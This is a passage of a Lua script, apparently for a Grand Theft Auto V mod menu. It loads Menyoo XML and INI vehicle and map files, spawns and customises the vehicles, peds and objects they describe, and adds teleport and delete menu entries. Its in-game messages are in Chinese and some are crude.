    VEHICLE.SET_VEHICLE_LIVERY(vehicle, livery)
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, data['NumberPlateText'])
    VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, tonumber(data['NumberPlateTextIndex']))
    VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, tonumber(data['WindowTint']))
    VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, to_boolean(data['BulletProofTyres']))
    VEHICLE. SET_VEHICLE_DIRT_LEVEL(vehicle, tonumber(data['DirtLevel']))
    VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, tonumber(data['PaintFade']))
    VEHICLE.SET_CONVERTIBLE_ROOF_LATCH_STATE(vehicle, tonumber(data['RoofState']))
    VEHICLE.SET_VEHICLE_SIREN(vehicle, to_boolean(data['SirenActive']))
    VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, to_boolean(data['EngineOn']), true, false)

    AUDIO.SET_VEHICLE_RADIO_LOUD(vehicle, to_boolean(data['IsRadioLoud']))
    VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, tonumber(data['LockStatus']))
    if data['EngineHealth'] ~= nil then
        VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, tonumber(data['EngineHealth']))
    end
end

function menyoo_build_properties_table(kids)
    if kids ~= nil then
        local table = {}
        for k,v in pairs(kids) do
            local name = v.name
            local val = get_element_text(v)
            table[name] = val
        end
        return table
    end
    return nil
end

function menyoo_load_map(path)
    local all_entities = {}
    util.toast("地图在加载别猴急！！！！！！！!...")
    local entity_initial_handles = {}
    local xml_tbl = parse_xml(path).root
    local data = {}
    for a,b in pairs(xml_tbl.kids) do
        local vproperties = {}
        local pproperties = {}
        local name = b.name
        local isvehicle = false
        local isped = false
        if name == 'ReferenceCoords' then
            for k,v in pairs(b.kids) do
                if v.name == 'X' then
                    mmblip_x = tonumber(get_element_text(v))
                elseif v.name == 'Y' then
                    mmblip_y = tonumber(get_element_text(v))
                elseif v.name == 'Z' then
                    mmblip_z = tonumber(get_element_text(v))
                end
            end
            mmblip = HUD.ADD_BLIP_FOR_COORD(mmblip_x, mmblip_y, mmblip_z)
            HUD.SET_BLIP_SPRITE(mmblip, 77)
            HUD.SET_BLIP_COLOUR(mmblip, 48)
        end
        if name == 'Placement' then
            for c,d in pairs(b.kids) do
                if d.name == 'PositionRotation' then
                    for e, f in pairs(d.kids) do
                        data[f.name] = get_element_text(f)
                    end
                elseif d.name == 'VehicleProperties' then
                    isvehicle = true
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                elseif d.name == 'PedProperties' then
                    isped = true
                    pproperties[d.name] = d
                else
                    data[d.name] = get_element_text(d)
                end
            end
            mmpos = {}
            mmpos.x = tonumber(data['X'])
            mmpos.y = tonumber(data['Y'])
            mmpos.z = tonumber(data['Z'])
            mmrot = {}
            mmrot.pi = tonumber(data['Pitch'])
            mmrot.ro = tonumber(data['Roll'])
            mmrot.ya = tonumber(data['Yaw'])
            if STREAMING.IS_MODEL_VALID(data['ModelHash']) then
                local mment = 0
                if isvehicle then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_vehicle(data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_entity(mment, data)
                    menyoo_preprocess_car(mment, vproperties)
                elseif isped then
                    request_model_load(data['ModelHash'])
                    mment = entities.create_ped(0, data['ModelHash'], mmpos, mmrot.ya)
                    menyoo_preprocess_ped(mment, pproperties, {})
                    menyoo_preprocess_entity(mment, data)
                else
                    request_model_load(data['ModelHash'])
                    mment = entities.create_object(data['ModelHash'], mmpos)
                    menyoo_preprocess_entity(mment, data)
                end
                table.insert(all_entities, mment)
                ENTITY.SET_ENTITY_ROTATION(mment, mmrot.pi, mmrot.ro, mmrot.ya, 2, true)
            else
                util.toast("发现一些无效的模型.确保你没有使用需要mods文件的XML.")
            end
        end
    end
    if mmblip == nil then 
        util.toast("这张图在加载时出了问题.请确保该XML是Menyoo制作的XML.")
        return 
    end
    mm_maproot = menu.list(loaded_maps_root, path:gsub(maps_dir, "") .. ' [' .. mmblip .. ']', {"lancespoonerloadedmaps" .. mmblip}, "加载过了奶奶的")
    menu.action(mm_maproot, "传送至此地图", {"menyoomteleportto" .. mmblip}, "传送至此地图.", function(on_click)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mmpos.x, mmpos.y, mmpos.z, false, false, false)
    end)

    menu.action(mm_maproot, "删除地图", {"menyoomdelete" .. mmblip}, "", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(mm_maproot)
        -- apparently remove blip is fucked, so we set sprite to invis as a failsafe
        util.remove_blip(mmblip)
    end)
    util.toast("地图他妈的加载完成.在地图上寻找一个粉粉的L.")
end

function menyoo_load_vehicle(path)
    our_ped = players.user_ped()
    local all_entities = {}
    local entity_initial_handles = {}
    local data = {}
    local vproperties = {}
    local xml_tbl = parse_xml(path).root
    local initial_handle_index = 0
    -- n appears to be the enum of the kid, k is the actual kid table
    for k,v in pairs(xml_tbl.kids) do
        local name = v.name
        if name == 'VehicleProperties' then
            for n, p in pairs(v.kids) do
                local prop_name = p.name
                if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                    vproperties[prop_name] = p
                else
                    vproperties[prop_name]  = get_element_text(p)
                end
            end
        else
            if name == 'SpoonerAttachments' then
                data[name] = v
            else
                local el_text = get_element_text(v)
                data[name] = el_text
            end
        end
    end
    if data['ModelHash'] == nil then 
        util.toast(fail_text)
        return 
    end
    request_model_load(data['ModelHash'])
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(our_ped, 0.0, 5.0, 0.0)
    local vehicle = entities.create_vehicle(data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(our_ped))
    table.insert(all_entities, vehicle)
    ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
    PED.SET_PED_INTO_VEHICLE(our_ped, vehicle, -1)
    if data['InitialHandle'] == nil then
        initial_handle_index = initial_handle_index + 1
        data['InitialHandle'] = initial_handle_index
    end
    entity_initial_handles[data['InitialHandle']] = vehicle
    -- apply natives that can apply to any entity
    menyoo_preprocess_entity(vehicle, data)
    menyoo_preprocess_car(vehicle, vproperties)
    -- vehicle-specific natives
    -- now for the attachments...
    local attachments = data['SpoonerAttachments']
    all_attachments = {}
    if attachments ~= nil then
        for a,b in pairs(attachments.kids) do
            local vproperties = {}
            -- each item here should be "attachment" element
            local att_data = {}
            for c,d in pairs(b.kids) do
                local name = d.name
                local val = get_element_text(d)
                if name == 'PedProperties' or name == 'Attachment' or name == 'TaskSequence' then
                    att_data[name] = d
                elseif name == 'VehicleProperties' then
                    for n, p in pairs(d.kids) do
                        local prop_name = p.name
                        if prop_name == 'Colours' or prop_name == 'Neons' or prop_name == 'Mods' or prop_name == 'DoorsOpen' or prop_name == 'DoorsBroken' or prop_name == 'TyresBursted' then
                            vproperties[prop_name] = p
                        else
                            vproperties[prop_name]  = get_element_text(p)
                        end
                    end
                else
                    att_data[name] = val
                end
            end
            request_model_load(att_data['ModelHash'])
            -- 1 = ped, 2 = vehicle, 3 = object
            local attachment_info = menyoo_build_properties_table(att_data['Attachment'].kids)
            local entity = nil
            local isped = false
            if att_data['Type'] == '1' then
                local ped = entities.create_ped(0, att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(ourped))
                menyoo_preprocess_ped(ped, att_data, entity_initial_handles)
                entity = ped
            elseif att_data['Type'] == '2' then
                local veh = entities.create_vehicle(att_data['ModelHash'], coords, ENTITY.GET_ENTITY_HEADING(ourped))
                entity = veh
                menyoo_preprocess_entity(veh, att_data)
                menyoo_preprocess_car(veh, vproperties)
            elseif att_data['Type'] == '3' then
                local obj = entities.create_object(att_data['ModelHash'], coords)
                entity = obj
                menyoo_preprocess_entity(obj, att_data)
                -- obj code
            end
            table.insert(all_entities, entity)
            ENTITY.SET_ENTITY_INVINCIBLE(entity, true)
            local bone = tonumber(attachment_info['BoneIndex'])
            local x = tonumber(attachment_info['X'])
            local y = tonumber(attachment_info['Y'])
            local z = tonumber(attachment_info['Z'])
            local pitch = tonumber(attachment_info['Pitch'])
            local yaw = tonumber(attachment_info['Yaw'])
            local roll = tonumber(attachment_info['Roll'])
            all_attachments[entity] = {}
            all_attachments[entity]['attachedto'] = attachment_info['AttachedTo']
            all_attachments[entity]['bone'] = bone
            all_attachments[entity]['x'] = x
            all_attachments[entity]['y'] = y
            all_attachments[entity]['z'] = z
            all_attachments[entity]['pitch'] = pitch
            all_attachments[entity]['yaw'] = yaw
            all_attachments[entity]['roll'] = roll
            all_attachments[entity]['isped'] = isped
        end
        for k, v in pairs(all_attachments) do
            ENTITY.ATTACH_ENTITY_TO_ENTITY(k, entity_initial_handles[v['attachedto']], v['bone'], v['x'], v['y'], v['z'], v['pitch'], v['roll'], v['yaw'], true, false, true, v['isped'], 2, true)
        end
    end
    local this_blip = HUD.ADD_BLIP_FOR_ENTITY(vehicle)
    HUD.SET_BLIP_SPRITE(this_blip, 77)
    HUD.SET_BLIP_COLOUR(this_blip, 47)
    local this_veh_root = menu.list(loaded_vehicles_root, path:gsub(vehicles_dir .. '\\', ''), {"lancespoonerv" .. vehicle}, "")
    menu.action(this_veh_root, "删除", {"deletelancespoonerv" .. vehicle}, "删除这辆载具.", function(on_click)
        for k,v in pairs(all_entities) do
            entities.delete_by_handle(v)
        end
        menu.delete(this_veh_root)
        util.remove_blip(this_blip)
    end)
    menu.action(this_veh_root, "传送至载具内", {"teleportemenyoov" .. vehicle}, "", function(on_click)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), vehicle, -1)
    end)
    return vehicle
end

function ini_preprocess_vehicle(vehicle, data, ini_type, veh_index) 
    -- vehicle is a handle to an already-spawned vehicle
    if ini_type == 1 then
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, data.Primary or 0, data.Secondary or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data.SmokeR or 0, data.SmokeG or 0, data.SmokeB or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data.NeonR or 0, data.NeonG or 0, data.NeonB or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data.Wheels or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data.Pearl or 0, data.WheelColor or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data.Tint or 0)

        if data['BulletProofTires'] == 1 then 
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end
        for i=1, 4 do 
            if data['Neon' .. i] == 1 then 
                VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end

        for i=0, 48 do
            if data[i] ~= nil then 
                -- idk how we even determine if a car has custom tires in this format
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, data[i], false)
            end
        end

        for i=1, 9 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if data['extra' .. i] == 0 then true else false)
        end

    elseif ini_type == 2 then
        local v_mods = data['Vehicle Mods']
        local v_extras = data['Vehicle Extras']
        local v_toggles = data['Vehicle Toggles']
        local data = data.Vehicle 
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, data['primary paint'] or 0, data['secondary paint'] or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data['tyre smoke red'] or 0, data['tyre smoke green'] or 0, data['tyre smoke blue'] or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data['neon red'] or 0, data['neon green'] or 0, data['neon blue'] or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data['dirt level'] or 0)
        --VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data['wheel type'] or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data['pearlescent colour'] or 0, data['wheel colour'] or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data['window tint'] or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, data['plate index'] or 0)

        if data['bulletproof tyres'] == 1 then 
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end

        for i=1, 4 do 
            if data['neon ' .. i] == 1 then 
                VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end

        for i= 1, 7 do 
            if data['door ' .. i .. ' state'] == 1 then
                VEHICLE.SET_VEHICLE_DOOR_OPEN(vehicle, i, false, true)
            end
        end

        for i=0, 48 do
            if v_mods[i] ~= nil then 
                -- idk how we even determine if a car has custom tires in this format
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, v_mods[i], false)
            end
        end

        for i=1, 9 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if v_extras[i] == 0 then true else false)
        end

        for i=17, 22 do 
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, if v_toggles[i] == 1 then true else false)
        end

    elseif ini_type == 3 then
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, data.PrimaryPaint or 0, data.SecondaryPaint or 0)
        if data.PrimaryPaint == -1 then 
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, data.PrimaryR or 0, data.PrimaryG or 0, data.PrimaryB or 0)
        end 
        if data.SecondaryPaint == -1 then 
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, data.SecondaryR, data.SecondaryG, data.SecondaryB)
        end
        VEHICLE.SET_VEHICLE_MOD_COLOR_1(vehicle, data.PrimaryPaintT or 0, data.PrimaryPaint or 0, data.Pearlescent or 0)
        VEHICLE.SET_VEHICLE_MOD_COLOR_2(vehicle, data.SecondaryPaintT or 0, data.SecondaryPaint or 0)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, data.SmokeR or 0, data.SmokeG or 0, data.SmokeB or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, data.NeonR or 0, data.NeonG or 0, data.NeonB or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        --VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, data.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, data.Wheels or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, data.Pearlescent or 0, data.WheelsColor or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, data.WindowTint or 0)
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_6(vehicle, data.DashColor)
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vehicle, data.DashLightColor)

        if data.BulletProof == 1 then 
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(vehicle, false)
        end
        if data.NeonEnabled == 1 then
            for i=1, 4 do 
                VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, true)
            end
        end

        for i=0, 48 do
            if data[i] ~= nil then 
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, data[i], data.CustomTyres)
            end
        end

        for i=17, 22 do 
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, if data['TOGGLE_' .. i] == 1 then true else false)
        end

        for i=1, 9 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, if data['Extra_' .. i] == 0 then true else false)
        end

    elseif ini_type == 4 then 
        util.toast("这个INI只仅部分支持.如果模组看起来很奇怪或者有些东西不见了，那就没办法了铁铁.")
        local v_root = data['Vehicle' .. veh_index]
        local v_mods = data['Vehicle' .. veh_index .. "Mods"]
        local v_extras = data['Vehicle' .. veh_index .. "Extras"]
        local v_toggles = data['Vehicle' .. veh_index .. "Toggles"]
        local v_smoke = data['Vehicle' .. veh_index .. "TireSmoke"]
        local v_neon = data['Vehicle' .. veh_index .. "Neon"]
        local v_neon_color = data['Vehicle' .. veh_index .. "NeonColor"]
        local v_paintfade = data['Vehicle' .. veh_index .. "PaintFade"]
        local v_color_main = data['Vehicle' .. veh_index .. "VehicleColors"]
        local v_color_extra = data['Vehicle' .. veh_index .. "ExtraColors"]
        local v_color_custom_p = data['Vehicle' .. veh_index .. "CustomPrimaryColor"]
        local v_color_custom_s = data['Vehicle' .. veh_index .. "CustomSecondaryColor"]
        local v_wheel_type = data['Vehicle' .. veh_index .. "WheelType"]
        local v_plate = data['Vehicle' .. veh_index .. "Numberplate"]
        local v_window_tint = data['Vehicle' .. veh_index .. "WindowTint"]
        local v_is_custom_primary = data['Vehicle' .. veh_index .. "IsCustomPrimary"]
        local v_is_custom_secondary = data['Vehicle' .. veh_index .. "IsCustomSecondary"]
        local data = data['Vehicle' .. veh_index]

        for i=0, 49 do
            if data['M' .. tostring(i)] ~= nil then 
                VEHICLE.SET_VEHICLE_MOD(vehicle, i, v_mods['M' .. i], false)
            end
        end

        for i=0, 49 do 
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, i, v_toggles['T' .. i])
        end

        for i=1, 13 do 
            VEHICLE.SET_VEHICLE_EXTRA(vehicle, i, v_extras['E' .. i])
        end

        for i=1, 4 do 
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, i, v_neon["Enabled" .. i])
        end

        ENTITY.SET_ENTITY_DYNAMIC(vehicle, v_root.Dynamic)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, v_root.Visible, 0)
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, v_color_main.Primary or 0, v_color_main.Secondary or 0)
        if v_is_custom_primary['bool'] then 
            VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(v_color_custom_p.r or 0, v_color_custom_p.g or 0, v_color_custom_p.b or 0)
        end

        if v_is_custom_secondary['bool'] then 
            VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(v_color_custom_s.r or 0, v_color_custom_s.g or 0, v_color_custom_s.b or 0)
        end

        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicle, v_color_extra.Pearl or 0, v_color_extra.Wheel or 0)

    
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, v_smoke.R or 0, v_smoke.G or 0, v_smoke.B or 0)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, v_neon_color.R or 0, v_neon_color.G or 0, v_neon_color.B or 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "LANCE")
        --VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, data.Dirt or 0)
        VEHICLE.SET_VEHICLE_ENVEFF_SCALE(vehicle, v_paintfade.PaintFade or 0)
        VEHICLE.SET_VEHICLE_WHEEL_TYPE(vehicle, v_wheel_type or 0)
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, v_window_tint or 0)
        ENTITY.SET_ENTITY_INVINCIBLE(vehicle, v_root.Invincible or false)
        ENTITY.SET_ENTITY_HAS_GRAVITY(vehicle, v_root.Gravity or true)
        ENTITY.FREEZE_ENTITY_POSITION(vehicle, v_root.Freeze or false)
        ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicle, v_root.ScorchedRender or false)
        ENTITY.SET_ENTITY_ALPHA(vehicle, v_root.Alpha or 255, false) 
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(vehicle, v_root.Dirt or 0.0) 
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, v_root.IsEngineOn, true, false)
        VEHICLE.SET_VEHICLE_LIGHT_MULTIPLIER(vehicle, v_root.HeadlightMultiplier or 1.0)
    end
end

function tprint (tbl, indent)
    if not indent then indent = 0 end
    for k, v in pairs(tbl) do
      formatting = string.rep("  ", indent) .. k .. ": "
      if type(v) == "table" then
        print(formatting)
        tprint(v, indent+1)
      elseif type(v) == 'boolean' then
        print(formatting .. tostring(v))      
      else
        print(formatting .. v)
      end
    end
  end

function ini_load_vehicle(file_name)
    local data
    success, data = pcall(iniparser.parse, file_name, vehicles_dir)
    if not success then 
        util.toast("加载他妈的这个INI时出现了致命错误!请检查INI文件，然后再你妈的重试. ")
    end
    local all_entities = {}
    local ini_type = -1
    -- determine type of ini file 
    -- type 1 has no spaces in it (i.e Airship.xml). 
    -- type 2 does and has  lowercase shit (420 Hydra.ini). it's also extremely stupid
    -- type 3 is extremely similar to type 1, but has values like PrimaryPaintT (BayWatch Blazer.xml)
    -- type 4 has an "AllObjects", "AllPeds", "AllVehicles" section in the ini (4tire_bike.ini)
    -- type 5 has AllObjects and AllVehicles (Boat-fsx.ini) (seems like theres an iniparser glitch in this one)
    -- type 6 is like type 2, but some keys are different, namely the numbers for attachments are called "Attached Object x" (Tankamid.ini)

    if data.Vehicle.model == nil and data.Vehicle.PrimaryPaintT == nil and data.AllVehicles.Count == nil then 
        ini_type = 1
    elseif data.Vehicle.model ~= nil and data['Attached Object 1'].model == nil then 
        ini_type = 2
    elseif data.Vehicle.model == nil and data.Vehicle.PrimaryPaintT ~= nil then 
        ini_type = 3
    elseif data.AllObjects.Count ~= nil and data.AllVehicles.Count ~= nil and data.AllPeds.Count ~= nil then 
        ini_type = 4
    elseif data.Vehicle.model ~= nil and data['Attached Object 1'].model ~= nil then 
        ini_type = 6
    end


    if ini_type == -1 then
        util.toast("不支持此INI类型! 傻逼滚 :(")
        return
    end
    -- there is also an ini type 6...
    local initial_vehicle
    local v_count = 1
    local success = false
    if ini_type == 1 then 
        local v_hash = data['Vehicle']['Model']
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data['Vehicle'], ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].Model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.Model)
            local this_ent = entities.create_object(here.Model, players.get_position(players.user()))
            all_entities[#all_entities+1] = this_ent
            if this_ent ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, here['Bone'], here['X'], here['Y'], here['Z'], here['RotX'], here['RotY'], here['RotZ'], true, if here['Collision'] == 1 then true else false, true, false, 2, true)
                if here['Froozen'] == 1 then 
                    ENTITY.FREEZE_ENTITY_POSITION(this_ent, true)
                end

                if here['Lit'] == 1 then 
                    FIRE.START_ENTITY_FIRE(this_ent)
                end
                attachment_index = attachment_index + 1
            end
        end
    elseif ini_type == 2 then
        local v_hash = data.Vehicle.model
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data, ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.model)
            local this_ent = entities.create_object(here.model, players.get_position(players.user()))
            if this_ent ~= nil then
                all_entities[#all_entities+1] = this_ent
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['x'], here['y'], here['z'], here['RotX'], here['RotY'], here['RotZ'], true, false, true, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end

    elseif ini_type == 3 then
        local v_hash = data.Vehicle.Model
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        local c = players.get_position(players.user())
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data.Vehicle, ini_type)
        local attachment_index = 0
        while true do 
            if data[tostring(attachment_index)].Model == nil then 
                success = true
                break
            end
            local here = data[tostring(attachment_index)]
            request_model_load(here.Model)
            local this_ent = entities.create_object(here.Model, players.get_position(players.user()))
            if this_ent ~= nil then
                all_entities[#all_entities+1] = this_ent
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['X'], here['Y'], here['Z'], here['RotX'], here['RotY'], here['RotZ'], true, false, true, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end
    
    elseif ini_type == 4 then 
        local numerations = {}
        local attachments_data = {}
        local veh_index = 0
        local object_index = 0 
        local ped_index = 0
        while true do
            if data['Vehicle' .. tostring(veh_index)].Hash == nil then 
                success = true
                break
            end
            local here = data['Vehicle' .. tostring(veh_index)]
            if here.Hash == nil then 
                util.toast(fail_text)
                return
            end
            request_model_load(here.Hash)
            local this_vehicle = entities.create_vehicle(here.Hash, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(players.user_ped()))
            if veh_index == 0 then 
                initial_vehicle = this_vehicle
            end
            numerations[here.SelfNumeration] = this_vehicle
            if here.IsAttached then
                attachments_data[here.SelfNumeration] = {attachee = this_vehicle, attached_to = here.AttachNumeration, x = here.OffsetX, y = here.OffsetY, z = here.OffsetZ, pitch = here.Pitch, yaw = here.Yaw, roll = here.Roll, bone = here.Bone, collision = here.Collision}
            end
            all_entities[#all_entities+1] = this_vehicle
            ini_preprocess_vehicle(this_vehicle, data, ini_type, veh_index)
            veh_index = veh_index + 1
        end

        while true do
            if data['Object' .. tostring(object_index)].Hash == nil then 
                success = true
                break
            end
            local here = data['Object' .. tostring(object_index)]
            request_model_load(here.Hash)
            local this_object = entities.create_object(here.Hash, players.get_position(players.user()))
            numerations[here.SelfNumeration] = this_object
            if here.IsAttached then
                attachments_data[here.SelfNumeration] = {attachee = this_object, attached_to = here.AttachNumeration, x = here.OffsetX, y = here.OffsetY, z = here.OffsetZ, pitch = here.Pitch, yaw = here.Yaw, roll = here.Roll, bone = here.Bone, collision = here.Collision}
            end
            all_entities[#all_entities+1] = this_object
            ENTITY.SET_ENTITY_DYNAMIC(veh, here.Dynamic)
            ENTITY.SET_ENTITY_VISIBLE(veh, here.Visible) 
            ENTITY.SET_ENTITY_HAS_GRAVITY(veh, here.Gravity)
            ENTITY.FREEZE_ENTITY_POSITION(veh, here.Freeze)
            object_index = object_index + 1
        end

        for k,v in pairs(attachments_data) do
            if v.attachee ~= nil and numerations[v.attached_to] ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(v.attachee, numerations[v.attached_to], v.Bone, v.x, v.y, v.z, v.pitch, v.roll, v.yaw, true, false, v.collision, false, 2, true)
            end
        end

    elseif ini_type == 6 then 
        local v_hash = data.Vehicle.model
        local c = players.get_position(players.user())
        if v_hash == nil then 
            util.toast(fail_text)
            return
        end
        request_model_load(v_hash)
        initial_vehicle = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
        all_entities[#all_entities+1] = initial_vehicle
        ini_preprocess_vehicle(initial_vehicle, data, ini_type)
        local attachment_index = 1
        while true do 
            if data['Attached Object ' .. tostring(attachment_index)].model == nil then 
                success = true
                break
            end
            local here = data['Attached Object ' .. tostring(attachment_index)]
            request_model_load(here.model)
            local this_ent = entities.create_object(here.model, players.get_position(players.user()))
            all_entities[#all_entities+1] = this_ent
            if this_ent ~= nil then
                ENTITY.ATTACH_ENTITY_TO_ENTITY(this_ent, initial_vehicle, 0, here['x offset'], here['y offset'], here['z offset'], here['pitch'], here['roll'], here['yaw'], true, false, if here['collision'] == 1 then true else false, false, 2, true)
                attachment_index = attachment_index + 1
            end
        end
    end

    if success then
        PED.SET_PED_INTO_VEHICLE(players.user_ped(), initial_vehicle, -1)
        local this_veh_root = menu.list(loaded_vehicles_root, file_name, {"lancespoonerv" .. initial_vehicle}, "")

        local this_blip = HUD.ADD_BLIP_FOR_ENTITY(initial_vehicle)
        HUD.SET_BLIP_SPRITE(this_blip, 77)
        HUD.SET_BLIP_COLOUR(this_blip, 47)

        menu.action(this_veh_root, "删除", {"deletelancespoonerv" .. initial_vehicle}, "Delete this vehicle. Make it cease to exist.", function(on_click)
            for k,v in pairs(all_entities) do
                entities.delete_by_handle(v)
            end
            menu.delete(this_veh_root)
            util.remove_blip(this_blip)
        end)

        menu.action(this_veh_root, "传送至载具内", {"teleportemenyoov" .. initial_vehicle}, "", function(on_click)
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), initial_vehicle, -1)
        end)

    else
        util.toast(fail_text)
    end
end

function json_preprocess_vehicle(vehicle, data, initial_vehicle)
    local sd = data.savedata
    local mods = sd.Mods
